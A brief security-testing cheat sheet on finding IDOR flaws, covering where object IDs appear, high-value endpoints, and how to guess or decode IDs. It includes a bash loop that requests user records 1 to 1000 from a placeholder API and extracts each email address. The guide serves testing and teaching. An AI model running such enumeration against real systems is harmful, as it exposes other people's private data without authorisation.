# Finding IDORs

## Entry Points

### URL Parameters
```
/api/users/123/profile
/files/550e8400-e29b-41d4-a716-446655440000
/download?id=42
```

### Request Body
```json
{"user_id": 321, "order_id": 987}
```

### Headers & Cookies
```http
X-Client-ID: 4711
Cookie: UID2=4820041
```

## High-Value Endpoints

| Type | Examples |
|------|----------|
| User data | `/api/users/{id}/profile`, `/settings` |
| Financial | `/invoices/{id}`, `/transactions/{id}` |
| Files | `/documents/{id}`, `/attachments/{uuid}` |
| Messages | `/messages/{id}`, `/notifications` |
| Admin | `/admin/users/{id}`, `/api/keys/{id}` |

## ID Patterns

```python
# Sequential
123 → 124 → 125

# Encoded (decode, modify, re-encode)
base64("user_123") → base64("user_124")

# UUID v1 (timestamp-based, predictable)
# Use uuid1mc tool to predict

# Hashed (look for leaks elsewhere)
md5(user_id) leaked in error messages
```

## Detection Automation

```bash
# Burp: Authorize extension
# Manual: Swap IDs in Intruder

for id in $(seq 1 1000); do
  resp=$(curl -s "https://target.com/api/users/$id" \
    -H "Authorization: Bearer $TOKEN")
  echo "$id: $(echo $resp | jq -r '.email // empty')"
done
```

## Quick Checklist

- [ ] Map all endpoints with IDs
- [ ] Identify your own IDs vs others
- [ ] Test sequential values
- [ ] Check encoded/hashed IDs
- [ ] Test across roles (user→admin)
- [ ] Check mobile/API endpoints separately
